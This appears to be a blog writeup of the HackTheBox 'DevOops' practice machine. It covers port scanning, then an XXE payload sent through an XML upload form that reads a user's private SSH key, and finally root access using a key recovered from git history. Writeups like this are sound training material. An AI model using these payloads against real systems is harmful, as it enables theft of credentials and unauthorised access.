---
layout: post
title:  "HackTheBox: DevOops writeup"
date:   2018-10-10 10:00:00 +0200
comments: true
author: BoiteAKlou
categories:

---


Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.

![DevOops box]({{ "/assets/2018-10-10/devoops-box.png" | absolute_url }} "DevOops Box")

In this article, I'll detail every step I've gone through in order to root the DevOops box, from the reconnaissance phate to the privilege escalation.
 <!--excerpt-->

# Table of Contents
{:.no_toc}

* TOC
{:toc}

## Recon

The only information we get when starting a new box is the IP address of the machine. With experience, you'll develop your own reconnaissance routine but I think that all of them start with the good old nmap port scanning.

### Port scanning

Nmap is a very powerful tool offering a lot of features and options that can be a bit tricky to use for beginners. First, we will perform a fast scan of TCP open ports with OS and services version detection.

```bash
boiteaklou@kali:/DevOops$ nmap -A -v 10.10.10.91
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
    |   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
    |_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
    5000/tcp open  http    Gunicorn 19.7.1
    | http-methods: 
    |_  Supported Methods: HEAD OPTIONS GET
    |_http-server-header: gunicorn/19.7.1
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> In a future article dedicated to reconnaissance, I'll show more Nmap commands that can be very useful in other contexts.

The scan output reveals **ssh** on port 22 and an **http server** listening on the non-standard port 5000. We also have service versions to keep in mind for an eventual exploit.

Let's investigate this Web application and come back to if we hit a deadend.


## Web Application Mapping

First, reach this URL (http://10.10.10.91:5000) with a web browser.

![Website]({{ "/assets/2018-10-10/webapp.png" | absolute_url }} "Website"){:width="80%"}

The page doesn't show any link or dynamic content so let's run **dirb** in order to discover valid URLs.
Dirb is a web content scanner which bruteforces directories and files names on web servers.

```bash
boiteaklou@kali:/DevOops$ dirb http://10.10.10.91:5000

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Oct 11 23:16:57 2018
URL_BASE: http://10.10.10.91:5000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.91:5000/ ----
+ http://10.10.10.91:5000/feed (CODE:200|SIZE:546263)                                                                                               
+ http://10.10.10.91:5000/upload (CODE:200|SIZE:347)                                                                                                
                                                                                                                                                    
-----------------
END_TIME: Thu Oct 11 23:22:22 2018
DOWNLOADED: 4612 - FOUND: 2
```

Good news! Upload features are generally poorly secured inside web applications. Let's visit this page!

![Upload page]({{ "/assets/2018-10-10/upload.png" | absolute_url }} "Upload page")


## From XXE to User access

**Xml eXternal Entities** is an exploit based on weakly configured XML parsers that allow arbitrary file reading on the webserver. 

Since this web application wants us to upload XML files, it seemed natural to me to test this vulnerability.

I used the following payload:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<Book>
    <Author>BoiteAKlou</Author>
    <Subject>&example;</Subject>
    <Content>Payload</Content>
</Book>
```
And here is the output from the server:

`PROCESSED BLOGPOST: Author: BoiteAKlou Subject: Doe Content: Payload URL for later reference: /uploads/test2.xml File path: /home/roosa/deploy/src`

We see that the Subject has been replaced by **Doe** so the server is vulnerable.

At this point, we can retrieve a bunch of interesting files or get **roosa's private ssh key** and then login via ssh.

Here's the payload I used:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [
<!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<Book>
    <Author>BoiteAKlou</Author>
    <Subject>Payload</Subject>
    <Content>&xxe;</Content>
</Book>
```

Once the private key retrieved, we can connect via ssh and enjoy the user flag:
```bash
boiteaklou@kali:/DevOops$ ssh -i id_rsa roosa@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Thu Oct 11 17:27:36 2018 from 10.10.12.226
roosa@gitter:~$ cat user.txt 
c5808e[..]ecc67b
```
Now things are getting serious...

## Getting root

### Enumeration

Every privilege escalation requires an exhaustive enumeration of the system. This is quite a long process which can be facilitated by scripts such as [LinEnum](https://github.com/rebootuser/LinEnum).

I won't detail here my whole process of enumerating, only the relevant part in our case.

The TODO note we found when consulting the website suggested that this project was versioned. In that case, it could be interesting to retrieve the content of a **git** or **svn** folder.

You can use the following command to look for any **.git** directory:
```bash
roosa@gitter:~$ find . -type d -name .git 2>/dev/null
./work/blogfeed/.git
```

Great we found one! Let's see what we can learn from it...
### Sensitive git repository

`git log` shows us every commit message from this repository and the two commits below caught my attention:

```
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend
```

I immediately jumped back to the commit where the key was accidentaly added, thanks to this command:

```bash
roosa@gitter:~/work/blogfeed$ git checkout d387abf63e05c9628a59195cec9311751bdb283f
error: Your local changes to the following files would be overwritten by checkout:
	run-gunicorn.sh
Please, commit your changes or stash them before you can switch branches.
Aborting
```

Crap! We have unstaged changes. No problem, we can tell git to ignore these changes with `git checkout -- run-gunicorn.sh` and then re-execute it.

```bash
roosa@gitter:~/work/blogfeed$ git checkout d387abf63e05c9628a59195cec9311751bdb283f
Note: checking out 'd387abf63e05c9628a59195cec9311751bdb283f'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at d387abf... add key for feed integration from tnerprise backend
```

Better! The file **authcredentials.key** has appeared inside resources/integration/.
Let's try to login as root using this key:

```bash
roosa@gitter:~/work/blogfeed$ ssh -i resources/integration/authcredentials.key root@localhost
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'resources/integration/authcredentials.key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "resources/integration/authcredentials.key": bad permissions
root@localhost's password: 
```

SSH refuses to use this key because permissions are too open. We can fix this with `chmod 0600 resources/integration/authcredentials.key` and try to connect again.

```bash
roosa@gitter:~/work/blogfeed$ ssh -i resources/integration/authcredentials.key root@localhost
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Fri Oct 12 04:48:17 2018 from 10.10.13.23
root@gitter:~# 
```

Bingo! Enjoy the flag :wink:

<p id="signature">BoiteAKlou :hammer:</p>
